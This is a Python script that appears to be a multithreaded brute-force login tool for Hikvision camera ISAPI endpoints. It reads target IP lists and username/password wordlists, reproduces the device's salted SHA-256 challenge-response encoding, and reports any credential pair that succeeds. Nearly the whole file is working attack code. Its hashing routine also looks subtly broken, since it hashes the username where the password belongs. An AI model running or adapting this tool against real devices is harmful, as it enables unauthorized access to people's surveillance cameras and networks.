import argparse
import threading
import requests
import hashlib
import os
import xml.etree.ElementTree as ET
import time

challengeUrl = "http://{username}:{password}@{ip}:{port}/ISAPI/Security/sessionLogin/capabilities?username={username}"

getUrl = "http://{ip}:{port}/{loginName}/{password}"
postUrl = "http://{ip}:{port}/ISAPI/Security/sessionLogin?timeStamp={timeStamp}"
#    "http://{ip}:{port}/ISAPI/Security/userCheck",

postPayload = """<userCheck>
<userName>{username}</userName>
<password>{password}</password>
<sessionid>{sessionid}</sessionid>
</userCheck>"""
postContentType = "application/xml"


def sha256(data):
    """Compute SHA-256 hash of the given data and return it in hexadecimal format."""
    return hashlib.sha256(data.encode('utf-8')).hexdigest()


def encode_pwd(username, t, a):
    """Encode the password based on the provided parameters and return the result."""
    if a:
        # Compute SHA-256 hash of userName + salt + username
        i = sha256(username + t['salt'] + username)
        # Compute SHA-256 hash of the above result + challenge
        i = sha256(i + t['challenge'])
        # Iterate SHA-256 hashing for iIterate times
        for _ in range(2, int(t['iterations'])):
            i = sha256(i)
    else:
        # Compute SHA-256 hash of username and append challenge
        i = sha256(username) + t['challenge']
        # Iterate SHA-256 hashing for iIterate times
        for _ in range(1, int(t['iterations'])):
            i = sha256(i)

    return i


# Function to validate file existence and readability
def validate_file(file_path, file_name):
    if not file_path:
        raise ValueError(f"{file_name} is required")
    if not os.path.isfile(file_path) or not os.access(file_path, os.R_OK):
        raise ValueError(f"{file_name} is not readable or does not exist")


def get_encryption_settings(username, password, ip, port):
    url = challengeUrl.format(ip=ip, port=port, username=username, password=password)
    response = requests.get(url)
    if response.status_code != 200:
        raise ValueError("Cannot request encryption settings from: " + url)
    return parse_challenge_response(response.text)


def parse_challenge_response(xml):
    # Parse the XML
    root = ET.fromstring(xml)

    # Define the namespace (as it's used in the XML)
    namespace = {'ns': 'http://www.hikvision.com/ver20/XMLSchema'}

    # Extract data
    session_id = root.find('ns:sessionID', namespace).text
    challenge = root.find('ns:challenge', namespace).text
    iterations = root.find('ns:iterations', namespace).text
    is_irreversible = root.find('ns:isIrreversible', namespace).text
    salt = root.find('ns:salt', namespace).text

    return {'sessionid': session_id, 'challenge': challenge, 'iterations': iterations,
        'isIrreversible': is_irreversible, 'salt': salt}


# Function to load IP addresses from the ipfile, checking port
def load_ip_addresses(ipfile):
    ip_addresses = []
    with open(ipfile, 'r') as f:
        for line in f:
            line = line.strip()
            if line.startswith('#') or not line:
                continue
            if ':' in line:
                ip, port = line.split(':')
            else:
                ip, port = line, 80
            ip_addresses.append((ip, int(port)))
    return ip_addresses


# Function to load lines from a file, stripping whitespace
def load_lines(file):
    with open(file, 'r') as f:
        return [line.strip() for line in f if line.strip()]


# Function to make HTTP requests
def create_payload(login, password, enc_settings):
    encoded_pwd = encode_pwd(login, enc_settings, True)
    return postPayload.format(username=login, password=encoded_pwd, sessionid=enc_settings.get("sessionid"))


def make_request(ip, port, logins, passwords, method):
    print(f"{ip}:{port}")
    timestamp = time.time()
    for login in logins:
        for password in passwords:
            url = postUrl.format(ip=ip, port=port, timeStamp=timestamp)
            enc_settings = get_encryption_settings(login, password, ip, port)

            payload = create_payload(login, password, enc_settings)
            headers = {'Content-Type': postContentType}
            response = requests.post(url, data=payload, headers=headers)

            print(f"Request: {login}, {password} -> Response Code: {response.status_code}")

            if response.status_code == 404:
                print("Url not found (404) - check if target is of correct type")
                return
            if response.status_code == 501:
                print("Method POST not allowed  (501) - check if target is of correct type")
                return
            if response.status_code == 200:
                print("FOUND: " + login + "/" + password)
                return {"user": login, "password": password}


#                except Exception as e:(
#                    print(f"Request failed: {e}"))

# Worker function to be run in threads
def worker(ip, port, logins, passwords, method):
    make_request(ip, port, logins, passwords, method)


# Main function
def main():
    # Argument parsing
    parser = argparse.ArgumentParser(description='Multithreaded HTTP Requester')
    parser.add_argument('--ipfile', required=True, help='File with list of IP addresses')
    parser.add_argument('--logins', required=True, help='File containing user names')
    parser.add_argument('--passwords', required=True, help='File containing passwords')
    parser.add_argument('--thread_limit', type=int, default=5, help='Maximum number of threads')
    parser.add_argument('--method', choices=['GET', 'POST'], default='GET', help='HTTP method to use (GET or POST)')
    args = parser.parse_args()

    # Validate files
    validate_file(args.ipfile, 'ipfile')
    validate_file(args.logins, 'logins')
    validate_file(args.passwords, 'passwords')

    # Load data from files
    ip_addresses = load_ip_addresses(args.ipfile)
    logins = load_lines(args.logins)
    passwords = load_lines(args.passwords)

    # Create and manage threads
    threads = []
    for ip, port in ip_addresses:
        while len(threads) >= args.thread_limit:
            # Join threads as they complete
            for t in threads:
                if not t.is_alive():
                    t.join()
                    threads.remove(t)

        # Spawn new thread
        t = threading.Thread(target=worker, args=(ip, port, logins, passwords, args.method))
        threads.append(t)
        t.start()

    # Join all remaining threads
    for t in threads:
        t.join()


if __name__ == '__main__':
    main()
